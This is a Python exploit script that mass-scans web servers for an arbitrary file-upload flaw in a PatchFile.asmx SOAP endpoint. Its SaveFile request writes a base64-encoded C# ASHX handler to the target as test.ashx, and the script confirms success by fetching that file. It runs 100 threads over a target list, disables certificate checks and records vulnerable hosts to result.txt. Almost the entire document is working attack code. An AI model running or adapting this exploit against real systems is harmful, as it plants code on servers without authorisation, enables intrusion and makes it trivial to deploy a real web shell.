import requests,sys,argparse
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()

def banner():
    banner = """

██╗   ██╗██╗   ██╗██╗   ██╗ █████╗ ██╗   ██╗██████╗ ██╗      ██████╗  █████╗ ██████╗ 
╚██╗ ██╔╝╚██╗ ██╔╝██║   ██║██╔══██╗██║   ██║██╔══██╗██║     ██╔═══██╗██╔══██╗██╔══██╗
 ╚████╔╝  ╚████╔╝ ██║   ██║╚██████║██║   ██║██████╔╝██║     ██║   ██║███████║██║  ██║
  ╚██╔╝    ╚██╔╝  ██║   ██║ ╚═══██║██║   ██║██╔═══╝ ██║     ██║   ██║██╔══██║██║  ██║
   ██║      ██║   ╚██████╔╝ █████╔╝╚██████╔╝██║     ███████╗╚██████╔╝██║  ██║██████╔╝
   ╚═╝      ╚═╝    ╚═════╝  ╚════╝  ╚═════╝ ╚═╝     ╚══════╝ ╚═════╝ ╚═╝  ╚═╝╚═════╝                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                
                                                           
                                                                        version: 1.0
"""
    print(banner)
def main():
    banner()
    parser = argparse.ArgumentParser(description='QLBSQL! ')
    parser.add_argument('-u','--url',dest='url',type=str,help='input link')
    parser.add_argument('-f','--file',dest='file',type=str,help='file path')
    args = parser.parse_args()
    #判断输入的参数是单个还是文件
    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list=[]
        with open(args.file,"r",encoding="utf-8") as f:
            for url in f.readlines():
                url_list.append(url.strip().replace("\n",""))
        #多线程
        mp = Pool(100)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")

def poc(target):
    payload_url = "/CS/Office/AutoUpdates/PatchFile.asmx"
    url = target+payload_url
    headers={
        'User-Agent': 'Mozilla/5.0 (Windows NT 5.1) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.84 Safari/535.11 SE 2.X MetaSr 1.0',
        'Content-Length': '898',
        'Content-Type': 'text/xml; charset=utf-8',
        'Connection': 'close'
    }
    data = (
        '<?xml version="1.0" encoding="utf-8"?>\r\n'
        '<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">\r\n'
        '<soap:Body>\r\n'
        '<SaveFile xmlns="http://tempuri.org/">\r\n'
            '<binData>PCVAIFdlYkhhbmRsZXIgTGFuZ3VhZ2U9IkMjIiBDbGFzcz0iVGVzdEhhbmRsZXIiICU+Cgp1c2luZyBTeXN0ZW07CnVzaW5nIFN5c3RlbS5XZWI7CgpwdWJsaWMgY2xhc3MgVGVzdEhhbmRsZXIgOiBJSHR0cEhhbmRsZXIKewogICAgcHVibGljIHZvaWQgUHJvY2Vzc1JlcXVlc3QoSHR0cENvbnRleHQgY29udGV4dCkKICAgIHsKICAgICAgICBjb250ZXh0LlJlc3BvbnNlLkNvbnRlbnRUeXBlID0gInRleHQvcGxhaW4iOwogICAgICAgIGNvbnRleHQuUmVzcG9uc2UuV3JpdGUoInRlc3QhIik7CiAgICB9CgogICAgcHVibGljIGJvb2wgSXNSZXVzYWJsZQogICAgewogICAgICAgIGdldCB7IHJldHVybiBmYWxzZTsgfQogICAgfQp9</binData>\r\n'
            '<path>./</path>\r\n'
            '<fileName>test.ashx</fileName>\r\n'
        '</SaveFile>\r\n'
        '</soap:Body>\r\n'
        '</soap:Envelope>\r\n'
    )
    # proxie = {
    #     'http' : 'http://127.0.0.1:8080',
    #     'https' : 'http://127.0.0.1:8080'
    # }
    try:
        res = requests.post(url=url,headers=headers,data=data,verify=False,timeout=10)
        url2 = target+"/CS/Office/AutoUpdates/test.ashx"
        res2 = requests.get(url2, verify=False)
        if res.status_code == 200 and res2.status_code == 200 and 'test!' in res2.text :
            print(f"[+]该url存在漏洞{target}")
            with open('result.txt','a',encoding='utf-8') as fp:
                        fp.write(target+"\n")
                        return True
        else:
            print(f"[-]该url不存在漏洞{target}")
    except :
        print(f"[*]该url存在问题{target}")
        return False

if __name__ == '__main__':
    main()